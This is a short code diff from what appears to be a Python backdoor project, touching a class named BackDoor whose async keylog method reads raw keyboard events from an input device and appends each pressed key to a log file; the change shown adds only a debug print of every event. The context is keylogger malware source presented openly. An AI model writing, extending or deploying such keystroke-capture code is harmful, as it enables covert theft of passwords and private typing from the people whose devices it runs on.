@@ -176,6 +176,7 @@ class BackDoor:
     async def keylog(self, device):
         with open(self.log, 'a+') as f:
             async for event in device.async_read_loop():
+                print(event)
                 if event.type == ecodes.EV_KEY and event.value == 1:
                     try:
                         f.write(key_code_map[event.code])
